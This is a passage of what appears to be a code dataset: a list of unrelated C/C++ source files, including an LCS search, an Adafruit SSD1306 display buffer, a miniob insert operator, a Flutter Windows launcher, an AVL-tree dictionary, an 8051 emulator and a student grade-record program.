{\t//\u82e5\u76ee\u524d\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0e\u5df2\u77e5\u6700\u957f\u5b57\u7b26\u4e32\u957f\u5ea6\u76f8\u540c\uff0c\u5219\u5c06\u6b64\u6b21\u5bfb\u627e\u7684\u5b50\u5e8f\u5217\u5b58\u5165 \r\n\t\t\tLCS[len + 1] = '\\0'; //\u5728\u7ed3\u5c3e\u6dfb\u52a0\u7a7a\u5b57\u7b26\r\n\t\t\tstrcpy(maxstr[maxstrCount],LCS);\r\n\t\t\tmaxstrCount++;\r\n\t\t}\r\n\t\treturn;\r\n\t}\r\n\tfor(int i=pos_b;i<len_b;i++) {\t//a\u5e8f\u5217\u5b57\u7b26\u4e0eb\u5e8f\u5217\u5b57\u7b26\u8fdb\u884c\u6bd4\u5bf9 \r\n\t\tif(a[pos_a] == b[i]) {\t//\u5b57\u7b26\u76f8\u7b49\u5219\u5b58\u5165\u5f53\u524d\u516c\u5171\u5b50\u5e8f\u5217\u6570\u7ec4 \r\n\t\t\tLCS[len]=a[pos_a];\r\n\t\t\tMAXLEN(pos_a+1,i+1,len+1,LCS);\t//\u9012\u5f52\u5bfb\u627e\u516c\u5171\u5b57\u7b26 \r\n\t\t}\r\n\t}\r\n\tMAXLEN(pos_a+1,pos_b,len,LCS);\t//a\u5e8f\u5217\u7d22\u5f15\u4f4d\u7f6e\u540e\u79fb\u7ee7\u7eed\u5bfb\u627e\u516c\u5171\u5b57\u7b26 \r\n}\r\n\r\n\r\nint main() {\r\n\r\n\tprintf(\"\u8bf7\u8f93\u5165\u7b2c\u4e00\u4e2a\u5e8f\u5217:\");\r\n\tscanf(\"%s\",a);\r\n\tprintf(\"\u8bf7\u8f93\u5165\u7b2c\u4e8c\u4e2a\u5e8f\u5217:\");\r\n\tscanf(\"%s\",b);\r\n\tlen_a = strlen(a);\r\n\tlen_b = strlen(b);\r\n\t\r\n\tMAXLEN(0,0,0,LCS);\r\n\t\r\n\tprintf(\"\u6700\u957f\u516c\u5171\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\u4e3a:%d\\n\",maxlen);\r\n\tfor(int i=0;i<maxstrCount;i++) {\r\n\t\tprintf(\"%s\\n\",maxstr[i]);\r\n\t}\r\n\r\n\treturn 0;\r\n}\r\n",
    "/*********************************************************************\nThis is a library for our Monochrome OLEDs based on SSD1306 drivers\n\n  Pick one up today in the adafruit shop!\n  ------> http://www.adafruit.com/category/63_98\n\nThese displays use SPI to communicate, 4 or 5 pins are required to  \ninterface\n\nAdafruit invests time and resources providing this open source code, \nplease support Adafruit and open-source hardware by purchasing \nproducts from Adafruit!\n\nWritten by Limor Fried/Ladyada  for Adafruit Industries.  \nBSD license, check license.txt for more information\nAll text above, and the splash screen below must be included in any redistribution\n*********************************************************************/\n\n#include \"Adafruit_GFX.h\"\n#include \"Adafruit_SSD1306.h\"\n\n// the memory buffer for the LCD\n\nstatic uint8_t buffer[SSD1306_LCDHEIGHT * SSD1306_LCDWIDTH / 8] = { \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,\n0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x80, 0x80, 0xC0, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x80, 0xC0, 0xE0, 0xF0, 0xF8, 0xFC, 0xF8, 0xE0, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80,\n0x80, 0x80, 0x00, 0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80, 0x80, 0x80, 0x00, 0xFF,\n0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80, 0x80, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00,\n0x80, 0xFF, 0xFF, 0x80, 0x80, 0x00, 0x80, 0x80, 0x00, 0x80, 0x80, 0x80, 0x80, 0x00, 0x80, 0x80,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00, 0x8C, 0x8E, 0x84, 0x00, 0x00, 0x80, 0xF8,\n0xF8, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xE0, 0xE0, 0xC0, 0x80,\n0x00, 0xE0, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0xC7, 0x01, 0x01,\n0x01, 0x01, 0x83, 0xFF, 0xFF, 0x00, 0x00, 0x7C, 0xFE, 0xC7, 0x01, 0x01, 0x01, 0x01, 0x83, 0xFF,\n0xFF, 0xFF, 0x00, 0x38, 0xFE, 0xC7, 0x83, 0x01, 0x01, 0x01, 0x83, 0xC7, 0xFF, 0xFF, 0x00, 0x00,\n0x01, 0xFF, 0xFF, 0x01, 0x01, 0x00, 0xFF, 0xFF, 0x07, 0x01, 0x01, 0x01, 0x00, 0x00, 0x7F, 0xFF,\n0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0xFF,\n0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x03, 0x0F, 0x3F, 0x7F, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE7, 0xC7, 0xC7, 0x8F,\n0x8F, 0x9F, 0xBF, 0xFF, 0xFF, 0xC3, 0xC0, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFC, 0xFC, 0xFC,\n0xFC, 0xFC, 0xFC, 0xFC, 0xFC, 0xF8, 0xF8, 0xF0, 0xF0, 0xE0, 0xC0, 0x00, 0x01, 0x03, 0x03, 0x03,\n0x03, 0x03, 0x01, 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x03, 0x03, 0x01, 0x01,\n0x03, 0x01, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x03, 0x03, 0x01, 0x01, 0x03, 0x03, 0x00, 0x00,\n0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,\n0x03, 0x03, 0x03, 0x03, 0x03, 0x01, 0x00, 0x00, 0x00, 0x01, 0x03, 0x01, 0x00, 0x00, 0x00, 0x03,\n0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n#if (SSD1306_LCDHEIGHT == 64)\n0x00, 0x00, 0x00, 0x80, 0xC0, 0xE0, 0xF0, 0xF9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3F, 0x1F, 0x0F,\n0x87, 0xC7, 0xF7, 0xFF, 0xFF, 0x1F, 0x1F, 0x3D, 0xFC, 0xF8, 0xF8, 0xF8, 0xF8, 0x7C, 0x7D, 0xFF,\n0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x3F, 0x0F, 0x07, 0x00, 0x30, 0x30, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0xC0, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x30, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0xC0, 0xFE, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x7F, 0x3F, 0x1F,\n0x0F, 0x07, 0x1F, 0x7F, 0xFF, 0xFF, 0xF8, 0xF8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE, 0xF8, 0xE0,\n0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,",
    "/* Copyright (c) 2021 OceanBase and/or its affiliates. All rights reserved.\nminiob is licensed under Mulan PSL v2.\nYou can use this software according to the terms and conditions of the Mulan PSL v2.\nYou may obtain a copy of Mulan PSL v2 at:\n         http://license.coscl.org.cn/MulanPSL2\nTHIS SOFTWARE IS PROVIDED ON AN \"AS IS\" BASIS, WITHOUT WARRANTIES OF ANY KIND,\nEITHER EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT,\nMERCHANTABILITY OR FIT FOR A PARTICULAR PURPOSE.\nSee the Mulan PSL v2 for more details. */\n\n//\n// Created by WangYunlai on 2021/6/9.\n//\n\n#include \"sql/operator/insert_physical_operator.h\"\n#include \"sql/stmt/insert_stmt.h\"\n#include \"storage/table/table.h\"\n#include \"storage/trx/trx.h\"\n\nusing namespace std;\n\nInsertPhysicalOperator::InsertPhysicalOperator(Table *table, vector<Value> &&values)\n    : table_(table), values_(std::move(values))\n{}\n\nRC InsertPhysicalOperator::open(Trx *trx)\n{\n  Record record;\n  RC     rc = table_->make_record(static_cast<int>(values_.size()), values_.data(), record);\n  if (rc != RC::SUCCESS) {\n    LOG_WARN(\"failed to make record. rc=%s\", strrc(rc));\n    return rc;\n  }\n\n  rc = trx->insert_record(table_, record);\n  if (rc != RC::SUCCESS) {\n    LOG_WARN(\"failed to insert record by transaction. rc=%s\", strrc(rc));\n  }\n  return rc;\n}\n\nRC InsertPhysicalOperator::next() { return RC::RECORD_EOF; }\n\nRC InsertPhysicalOperator::close() { return RC::SUCCESS; }\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"book\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nclass node\r\n{\r\npublic:\r\n\tstring key;\r\n\tstring meaning;\r\n\tnode *left;\r\n\tnode *right;\r\n};\r\n\r\nclass AVL\r\n{\r\n\tnode *root;\r\n        public:\r\n            \tAVL()\r\n            \t{\r\n            \t\troot=NULL;\r\n            \t}\r\n            \t\r\n\t            void create();\r\n\t            node* insert(node *cur,node *temp);\r\n            \tnode* balance(node *temp);\r\n            \tint dif(node *temp);\r\n            \tint height(node *temp);\r\n            \tint maximum(int a,int b);\r\n            \t\r\n            \tnode* LL(node *par);\r\n            \tnode* RR(node *par);\r\n            \tnode* LR(node *par);\r\n            \tnode* RL(node *par);\r\n            \t\r\n            \tvoid ascending(node *temp);\r\n            \tnode* delete_n(node *root,string key1);\r\n            \tvoid deleten();\r\n            \t\r\n            \tnode* extractmin(node *t);\r\n                void descending(node *temp);\r\n                void display();\r\n                bool search(node *cur,string key1);\r\n                void search_value();\r\n};\r\n\r\nvoid AVL::create()\r\n{\r\n\tchar answer;\r\n\tnode *temp;\r\n\tdo\r\n\t{\r\n\t\ttemp=new node();\r\n\t\tcout<<\"\\n Enter the keyword:\";\r\n\t\tcin>>temp->key;\r\n\t\tcout<<\"\\n Enter the meaning:\";\r\n\t\tcin>>temp->meaning;\r\n\t\ttemp->left=temp->right=NULL;\r\n\r\n\t\t\troot=insert(root,temp);\r\n\r\n\t\tcout<<\"\\n Do you want to add another word?(y/n)\";\r\n\t\tcin>>answer;\r\n\t}\r\n\twhile(answer=='y'||answer=='Y');\r\n}\r\n\r\n\r\n    node*AVL::insert(node *cur,node *temp)\r\n{\r\n\tif(cur==NULL)\r\n\t{\r\n\t\treturn temp;\r\n\t}\r\n\tif(temp->key<cur->key)\r\n\t{\r\n\t\tcur->left=insert(cur->left,temp);\r\n\t\tcur=balance(cur);\r\n\t}\r\n\telse if(temp->key>cur->key)\r\n\t{\r\n\t\tcur->right=insert(cur->right,temp);\r\n\t\tcur=balance(cur);\r\n\t}\r\n\treturn cur;\r\n}\r\n\r\nnode* AVL::balance(node *temp)\r\n{\r\n\tint bal;\r\n\tbal=dif(temp);\r\n\t\r\n\tif(bal>=2)\r\n\t{\r\n\t\tif(dif(temp->left)<0)\r\n\t\t\ttemp=LR(temp);\r\n\t\telse\r\n\t\t\ttemp=LL(temp);\r\n\t}\r\n\telse if(bal<=-2)\r\n\t{\r\n\t\tif(dif(temp->right)<0)\r\n\t\t\ttemp=RR(temp);\r\n\t\telse\r\n\t\t\ttemp=RL(temp);\r\n\t}\r\n\treturn temp;\r\n}\r\n\r\n\r\nint AVL::dif(node *temp)\r\n{\r\n\tint l,r;\r\n\tl=height(temp->left);\r\n\tr=height(temp->right);\r\n\treturn(l-r);\r\n}\r\n\r\nint AVL::height(node *temp)\r\n{\r\n\tif(temp==NULL)\r\n\t\treturn(-1);\r\n\telse\r\n\t\treturn(max(height(temp->left),height(temp->right))+1);\r\n}\r\n\r\nint AVL::maximum(int a,int b)\r\n{\r\n\tif(a>b)\r\n\t\treturn a;\r\n\telse\r\n\t\treturn b;\r\n}\r\n\r\nnode* AVL::LL(node *par)\r\n{\r\n\tnode *temp,*temp1;\r\n\ttemp=par->left;\r\n\ttemp1=temp->right;\r\n\ttemp->right=par;\r\n\tpar->left=temp1;\r\n\treturn temp;\r\n}\r\n\r\nnode* AVL::RR(node *par)\r\n{\r\n\tnode *temp,*temp1;\r\n\ttemp=par->right;\r\n\ttemp1=temp->left;\r\n\ttemp->left=par;\r\n\tpar->right=temp1;\r\n\treturn temp;\r\n}\r\n\r\nnode* AVL::LR(node *par)\r\n{\r\n\tpar->left=RR(par->left);\r\n\treturn(LL(par));\r\n}\r\n\r\nnode* AVL::RL(node *par)\r\n{\r\n\tpar->right=LL(par->right);\r\n\treturn(RR(par));\r\n}\r\n\r\nvoid AVL::ascending(node *temp)\r\n{\r\n        if(temp!=NULL)\r\n        {\r\n                ascending(temp->left);\r\n                cout<<\"\\n\\t\"<<temp->key<<\" : \"<<temp->meaning;\r\n                ascending(temp->right);\r\n        }\r\n}\r\n\r\nvoid AVL::descending(node *temp)\r\n{\r\n        if(temp!=NULL)\r\n        {\r\n                descending(temp->right);\r\n                cout<<\"\\n\\t\"<<temp->key<<\" : \"<<temp->meaning;\r\n                descending(temp->left);\r\n        }\r\n}\r\n\r\n\r\nvoid AVL::display()\r\n{\r\n        cout<<\"\\n The keywords in ascending order are : \\n\";\r\n        ascending(root);\r\n        cout<<\"\\n The keywords in descending order are : \\n\";\r\n        descending(root);\r\n}\r\n\r\nbool AVL::search(node *cur,string key1)\r\n{\r\n\tif(cur)\r\n\t{\r\n\t\tif(cur->key==key1)\r\n\t\t\treturn true;\r\n\t\tif(cur->key>key1)\r\n\t\t\treturn search(cur->left,key1);\r\n\t\telse\r\n\t\t\treturn search(cur->right,key1);\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nvoid AVL::search_value()\r\n{\r\n\tstring key2;\r\n        cout<<\"\\n Enter the keyword you wish to search : \";\r\n        cin>>key2;\r\n        if(search(root,key2))\r\n                cout<<\"\\n The entered keyword is present in the AVL tree\";\r\n        else\r\n                cout<<\"\\n The entered keyword is not present in the AVL tree\";\r\n}\r\n\r\n\r\nnode* AVL::delete_n(node* cur,string key1)\r\n{\r\n    if ( !cur)\r\n    \treturn cur;\r\n    if ( key1 < cur->key )\r\n        cur->left = delete_n(cur->left, key1);\r\n\r\n    else if( key1 > cur->key )\r\n        cur->right = delete_n(cur->right, key1);\r\n\r\n    else\r\n    {\r\n        node *l = cur->left;\r\n        node *r = cur->right;\r\n        delete cur;\r\n        if ( !r )\r\n        \treturn l;\r\n        node *m=r;\r\n        \r\n        while(m->left)\r\n        \tm=m->left;\r\n        m->right = extractmin(r);\r\n        m->left = l;\r\n        return balance(m);\r\n    }\r\n    return balance(cur);\r\n}\r\n\r\n    node* AVL::extractmin(node *t)\r\n    {\r\n        if ( !t->left ) \r\n        return t->right;\r\n        t->left = extractmin(t->left);\r\n        return balance(t);\r\n    }\r\n\r\nvoid AVL::deleten()\r\n{\r\n\tstring key;\r\n\tcout<<\"\\n Enter the keyword to be deleted : \";\r\n\tcin>>key;\r\n\troot=delete_n(root,key);\r\n}\r\n\r\nint main()\r\n{\r\n  char c;\r\n  int ch;\r\n  AVL a;\r\n  do\r\n  {\r\n      cout<<\"***********\";\r\n\t  cout<<\"\\n 1.Insert a keyword in AVL tre",
    "#include <cstdint>\n#include \"header.hpp\"\n#include \"internal.hpp\"\n\nvoid mov_a_data()\n{\n    pc++; a = code[pc]; pc++;\n}\n\nvoid mov_b_data()\n{\n    pc++; b = code[pc]; pc++;\n}\n\nvoid mov_r0_data()\n{\n    pc++; *(r[0]) = code[pc]; pc++;\n}\n\nvoid mov_r1_data()\n{\n    pc++; *(r[1]) = code[pc]; pc++;\n}\n\nvoid mov_r2_data()\n{\n    pc++; *(r[2]) = code[pc]; pc++;\n}\n\nvoid mov_r3_data()\n{\n    pc++; *(r[3]) = code[pc]; pc++;\n}\n\nvoid mov_r4_data()\n{\n    pc++; *(r[4]) = code[pc]; pc++;\n}\n\nvoid mov_r5_data()\n{\n    pc++; *(r[5]) = code[pc]; pc++;\n}\n\nvoid mov_r6_data()\n{\n    pc++; *(r[6]) = code[pc]; pc++;\n}\n\nvoid mov_r7_data()\n{\n    pc++; *(r[7]) = code[pc]; pc++;\n}\n\nvoid add_a_data()\n{\n    int old_a = a;\n    pc++;\n    a += code[pc];\n    if (a < old_a)\n        set_carry();\n    pc++;\n}\n\nvoid push_a()\n{\n    sp++;\n    ram[sp] = a;\n    pc++;\n}\n\nvoid pop_a()\n{\n    a = ram[sp];\n    sp--;\n    pc++;\n}\n\nvoid mov_dptr_data()\n{\n    pc++;\n    dptr |= (unsigned int)(code[pc]) << 8;\n    pc++;\n    dptr |= (unsigned int)(code[pc]);\n    pc++;\n}\n\nvoid movx_a_dptr()\n{\n    a = data[dptr];\n    pc++;\n}\n\nvoid movx_dptr_a()\n{\n    data[dptr] = a;\n    pc++;\n}\n\nvoid inc_dptr()\n{\n    dptr++;\n    pc++;\n}\n\nvoid sjmp()\n{\n    pc++;\n    signed char offset = (signed char) code[pc];\n    pc += offset+1;\n}\n\nvoid mul_ab()\n{\n    a *= b;\n    pc++;\n}\n\nvoid div_ab()\n{\n    unsigned char quo, rem;\n    if (b != 0) {\n        quo = a / b;\n        rem = a % b;\n    }\n    a = quo;\n    b = rem;\n    pc++;\n}\n\nvoid empty() {}\n\nvoid (*lut[])() = {\n    empty,\n    mov_a_data,\n    mov_b_data,\n    mov_r0_data,\n    mov_r1_data,\n    mov_r2_data,\n    mov_r3_data,\n    mov_r4_data,\n    mov_r5_data,\n    mov_r6_data,\n    mov_r7_data,\n    add_a_data,\n    empty, // ADD A, B\n    empty, // ADD A, R0\n    empty, // ADD A, R1\n    empty, // ADD A, R2\n    empty, // ADD A, R3\n    empty, // ADD A, R4\n    empty, // ADD A, R5\n    empty, // ADD A, R6\n    empty, // ADD A, R7\n    push_a,\n    pop_a,\n    mov_dptr_data,\n    movx_a_dptr,\n    movx_dptr_a,\n    inc_dptr,\n    sjmp,\n    mul_ab,\n    div_ab,\n    // empty,\n};",
    "#include<iostream>\r\n#include<fstream>\r\n#include<iomanip>\r\nusing namespace std;\r\n\r\nclass student\r\n{\r\n\tprivate:\r\n\t\t\r\n\tint rollno;\r\n\tchar name[50];\r\n\tint oop_marks, ds_marks, ca_marks, eng_marks, cs_marks;\r\n\tdouble per;    //stores average mark\r\n\tchar grade;    //stores grade obtained by the student\r\n\t\r\n\tpublic:\r\n\t\t\r\n\tvoid calculate();\t          // function to calculate grade\r\n\tvoid getdata();\t\t         // function to get data from user\r\n\tvoid showdata() const;\t    // function to display the data \r\n\tvoid show_tabular() const;  //function to display student details in tabular form\r\n\tint retrollno() const;      //function to return roll number\r\n\t\r\n}; \r\n\r\nvoid student::calculate()\r\n{\r\n\tper = (oop_marks + ds_marks + ca_marks + eng_marks + cs_marks) / 5.0;\r\n\t\r\n\tif(per>=80)\r\n\t\tgrade='A';\r\n\telse if(per>=70)\r\n\t\tgrade='B';\r\n\telse if(per>=50)\r\n\t\tgrade='C';\r\n\telse\r\n\t\tgrade='F';\r\n}\r\n\r\nvoid student::getdata()\r\n{\r\n\tcout<<\"\\nEnter the Roll number of student \"<<\"\\t\"<< \":\";\r\n\tcin>>rollno;\r\n\t\r\n\tcout<<\"\\n\\nEnter the Name of student \"<<\"\\t\\t\"<< \":\";\r\n\tcin.ignore();\r\n\tcin.getline(name,50);\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Object Oriented Programming \"<<\"\\t\"<< \":\" ;\r\n\tcin>>oop_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Data Structures \"<<\"\\t\\t\"<< \":\" ;\r\n\tcin>>ds_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Computer Architecture \"<<\"\\t\"<< \":\" ;\r\n\tcin>>ca_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in English  \"<<\"\\t\\t\\t\"<< \":\" ;\r\n\tcin>>eng_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Computer Science \"<<\"\\t\\t\"<< \":\" ;\r\n\tcin>>cs_marks;\r\n\tcalculate();\r\n}\r\n\r\nvoid student::showdata() const\r\n{\r\n\tcout<<\"\\n Student Roll number \"<<\"\\t\"<< \":\" <<rollno;\r\n\tcout<<\"\\n Student Name \"<<\"\\t\\t\"<< \":\"<<name;\r\n\t\r\n\tcout<<\"\\n\\n MARKS SCORED BY THE STUDENT: \\n\";\r\n\tcout<<\"----- ------ -- --- --------\\n\";\r\n\t\r\n\tcout<<\"\\n Object Oriented Programming    :\"<<oop_marks;\r\n\tcout<<\"\\n Data Structures  \"<<\"\\t\\t\"<< \":\" <<ds_marks;\r\n\tcout<<\"\\n Computer Architecture  \"<<\"\\t\"<< \":\" <<ca_marks;\r\n\tcout<<\"\\n English \"<<\"\\t\\t\\t\"<< \":\"<<eng_marks;\r\n\tcout<<\"\\n Computer Science \"<<\"\\t\\t\"<< \":\"<<cs_marks;\r\n\t\r\n\tcout<<\"\\n\\n Percentage     :\"<<per;\r\n\tcout<<\"\\n Grade  \"<<\"\\t\"<< \":\"<<grade;\r\n}\r\n\r\nvoid student::show_tabular() const\r\n{\r\n\tcout<<rollno<<setw(6)<<\"\\t\"<<name<<setw(10)<<\"\\t\"<<oop_marks<<setw(4)<<\"\\t\"<<ds_marks<<setw(4)<<\"\\t\"<<ca_marks<<setw(4)<<\"\\t\"\r\n\t\t<<eng_marks<<setw(4)<<\"\\t\"<<cs_marks<<setw(8)<<\"\"<<per<<setw(6)<<\"\\t\"<<grade<<endl;\r\n}\r\n\r\nint  student::retrollno() const\r\n{\r\n\treturn rollno;\r\n}\r\n\r\n/* function declaration */\r\n\r\nvoid write_student();\t        // function to write the record in binary file\r\nvoid display_all();\t           // function to read records from binary file\r\nvoid display_sp(int);\t      // function to display specific record from binary file\r\nvoid modify_student(int);    // function to update record of binary file\r\nvoid delete_student(int);\t//function to delete selected records from binary file\r\nvoid class_result();\t   //function to display all records in tabular format \r\nvoid result();\t\t      //function to display result \r\nvoid intro();\t\t     //function to display welcome screen\r\nvoid entry_menu();\t    //function to display entry menu on screen\r\n\r\n\r\n\r\nint main()\r\n{\r\n\tchar ch;\r\n\tcout.setf(ios::fixed|ios::showpoint);\r\n\tcout<<setprecision(2);      // program outputs decimal number to two decimal places\r\n\tintro();\r\n\tdo\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\t\tcout<<\"\\n\\n\\n\\t MAIN MENU\";\r\n\t\tcout<<\"\\n\\t ---- -----\";\r\n\t\t\r\n\t\tcout<<\"\\n\\n\\t 1. ENTRY/EDIT MENU \";\r\n\t\tcout<<\"\\n\\n\\t 2. RESULT MENU \";\r\n\t\tcout<<\"\\n\\n\\t 3. EXIT \";\r\n\t\tcout<<\"\\n\\n\\n\\t Please Select Your Option  \";\r\n\t\tcin>>ch;\r\n\t\tswitch(ch)\r\n\t\t{\r\n\t\t\tcase '1': entry_menu();\r\n\t\t\t\tbreak;\r\n\t\t\tcase '2': result();\r\n\t\t\t\tbreak;\r\n\t\t\tcase '3':\r\n\t\t\t\tbreak;\r\n\t\t\tdefault :cout<<\"\\a\";\r\n\t\t}\r\n    }while(ch!='3');\r\n\treturn 0;\r\n}\r\n\r\n\r\n/*  function to write in file  */\r\n\r\nvoid write_student()\r\n{\r\n\tstudent st;\r\n\tofstream outFile;\r\n\toutFile.open(\"student.dat\",ios::binary|ios::app);\r\n\tst.getdata();\r\n\toutFile.write(reinterpret_cast<char *> (&st), sizeof(student));\r\n\toutFile.close();\r\n    cout<<\"\\n\\nStudent record Has Been Created \";\r\n\tcin.ignore();\r\n\tcin.get();\r\n}\r\n\r\n\r\n/*  function to read all records from file  */\r\n\r\nvoid display_all()\r\n{\r\n\tstudent st;\r\n\tifstream inFile;\r\n\tinFile.open(\"student.dat\",ios::binary);\r\n\tif(!inFile)\r\n\t{\r\n\t\tcout<<\"File could not be open !! Press any Key...\";\r\n\t\tcin.ignore();\r\n\t\tcin.get();\r\n\t\treturn;\r\n\t}\r\n\tcout<<\"\\n\\n\\n\\t\\t ALL STUDENTS RECORD. \\n\\n\";\r\n\twhile(inFile.read(reinterpret_cast<char *> (&st), sizeof(student)))\r\n\t{\r\n\t\tst.showdata();\r\n\t\tcout<<\"\\n\\n_________\\n\";\r\n\t}\r\n\tinFile.close();\r\n\tcin.ignore();\r\n\tcin.get();\r\n}\r\n\r\n\r\n/*  function to read specific record from file  */\r\n\r\nvoid display_sp(int n)\r\n{\r\n\tstudent st;\r\n\tifstream inFile;\r\n\tinFile.open(\"student.dat\",ios::binary);\r\n\tif(!inFile)\r\n\t{\r\n\t\tcout<<\"File could not be open !! Press any Key...\";\r\n\t\tcin.ignore();\r\n\t\tcin.get();\r\n\t\treturn;\r\n\t}\r\n\tbool flag=false;\r\n\twhile(inFile.read(reinterpret_cast<char *> (&st), sizeof(student)))\r\n\t{\r\n\t\tif(st.retroll",
